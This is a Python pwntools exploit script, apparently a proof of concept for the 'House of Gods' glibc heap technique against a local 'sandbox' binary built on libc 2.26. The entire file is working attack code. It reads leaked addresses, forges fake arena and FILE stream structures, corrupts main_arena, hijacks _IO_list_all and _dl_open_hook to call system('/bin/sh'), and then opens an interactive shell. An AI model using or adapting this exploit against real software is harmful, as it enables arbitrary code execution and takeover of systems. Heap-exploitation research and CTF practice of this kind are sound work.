#!/usr/bin/python3
    
#
# tested against: libc-2.26-no-tcache
#

from pwn import *

# =========================== globals ===========================

script = '''
continue
'''
    
ref = 0;

# =========================== main ===========================

def main():

    context.clear(arch = 'amd64');

    elf  = context.binary = ELF("sandbox");
    libc = ELF(elf.runpath + b"/libc.so.6");
    io   = initialize_io(elf);
    
    io.timeout = 0.1;

    # stage 1 - leak libbase
    libc.address = leak_libbase(io, libc.sym.puts);
    log.info("leaked libbase: " + hex(libc.address));

    # stage 2 - leak heapbase
    heapbase = leak_heapbase(io);
    log.info("leaked heapbase: " + hex(heapbase));

    # stage 3 - house of gods
    house_of_gods(io, libc, heapbase);
    log.info("thanks.");

    io.interactive();

# =========================== functions ===========================

def leak_libbase(io, puts):

    io.recvuntil(b"libbase: ");
    return int(io.recvline(), 16);

def leak_heapbase(io):

    io.recvuntil(b"heapbase: ");

    leak = int(io.recvline(), 16);
    io.recvuntil(b"> ");

    return leak;

def fakestream_init(io, libc, heapbase):

    _dl_hook   = allocate_chunk(io, 0x18);
    fakestream = allocate_chunk(io, 0xd8);

    fd = 0x0000000000000000;
    bk = heapbase + 0x20;

    layout  = p64(0x0000000000000000) + p64(heapbase + 0x20 + 0x20);
    layout += p64(0x0000000000000000) + p64(0xffffffffffffffff);
    layout += p64(0x0000000000000000) + p64(0x0000000000000000) * 0x12;
    layout += p64(0x0000000000000000) + p64(libc.sym.system);
    layout += p64(heapbase + 0xd8);

    edit_chunk(io, _dl_hook, p64(fd) + p64(bk) + b"/bin/sh\x00");
    edit_chunk(io, fakestream, layout);

def fake_arena_init(io, libc, heapbase):

    fake_arena = allocate_chunk(io, 0x878);

    layout  = p64(0x0000000000000000) + p64(0x0000000000000000) * 0xb;
    layout += p64(heapbase + 0x190)   + p64(libc.sym._dl_open_hook - 0x18);
    layout += p64(0x0000000000000000) + p64(0x0000000000000000) * 0xb;
    layout += p64(0x0000000000000000) + p64(heapbase + 0x368);
    layout += p64(heapbase + 0x368)   + p64(0x0000000000000000) * 0x7
    layout += p64(0x0000000000000000) + p64(libc.sym._IO_list_all - 0x18);
    layout += p64(0x0000000000000000) + p64(0x0000000000000000) * 0xe7;
    layout += p64(0xfffffffffffffffe);
    
    edit_chunk(io, fake_arena, layout);

def house_of_gods(io, libc, heapbase):

    ### stage 1 ###

    _next             = libc.sym.main_arena;
    _next_free        = 0x0000000000000000;
    _attached_threads = 0x0000000000000001;
    _system_mem       = 0xffffffffffffffff;
    _max_system_mem   = 0xffffffffffffffff;

    A = allocate_chunk(io, 0x88);
    B = allocate_chunk(io, 0x38);
    C = allocate_chunk(io, 0x18);
    D = allocate_chunk(io, 0x98);

    fakestream_init(io, libc, heapbase + 0x190);
    fake_arena_init(io, libc, heapbase);

    free_chunk(io, A);

    bk = libc.sym.main_arena + 0x0858 - 0x8;
    edit_chunk(io, A, p64(0x0) + p64(bk));

    bk = heapbase + 0x90 + 0x40 + 0x20;
    edit_chunk(io, B, p64(0x0) + p64(bk));

    bk = libc.sym.main_arena + 0x4 - 0x5 - 0x10;
    edit_chunk(io, D, p64(0x0) + p64(bk));

    free_chunk(io, B);
    free_chunk(io, C);

    payload  = p64(0)           + p64(_next);
    payload += p64(_next_free)  + p64(_attached_threads);
    payload += p64(_system_mem) + p64(_max_system_mem);

    E = allocate_chunk(io, 0x1f8);
    edit_chunk(io, E, payload);

    F = allocate_chunk(io, 0x98);

    ### stage 2 ###

    while True:

        fake_arena = heapbase + 0x290;
        edit_chunk(io, E, p64(0x00) + p64(fake_arena));

        UAF = allocate_chunk(io, 0x88);

        leak = read_chunk(io, E)[8 : 16];
        next = unpack(leak, 'all', endian = 'little');

        if process_alive(next) == False:
            break;

        XXX = allocate_chunk(io, 0x88);
        free_chunk(io, UAF);

        bk = next + 0x4 - 0x5 - 0x10;
        edit_chunk(io, UAF, p64(0x0) + p64(bk));

        EXFIT = allocate_chunk(io, 0x88);
        log.info("arena: " + hex(next));

    io.interactive();

def process_alive(response):

    heartbeat = 0x7f0000000000;
    return response & heartbeat == heartbeat;

def allocate_chunk(io, size):

    global ref;

    io.send(b"1\n");
    io.recvline();
    io.sendline(f"{size}".encode());
    io.recvuntil(b"> ");

    ref += 1;
    return ref - 1;

def free_chunk(io, ref):

    io.send(b"2\n");
    io.recvline();
    io.sendline(f"{ref}".encode());
    io.recvuntil(b"> ");

def edit_chunk(io, ref, data):

    io.send(b"3\n");
    io.recvline();
    io.sendline(f"{ref}".encode());
    io.recvline();
    io.send(data);
    io.recvuntil(b"> ");

def read_chunk(io, ref):

    io.send(b"4\n");
    io.recvline();
    io.sendline(f"{ref}".encode());

    chunkdata = io.recvline();
    io.recvuntil(b"> ");

    return chunkdata;


def initialize_io(elf):

    if args.GDB:
        return gdb.debug(elf.path, gdbscript = script);

    return process(elf.path);

# =========================== init main ===========================

if __name__=="__main__":

   main();
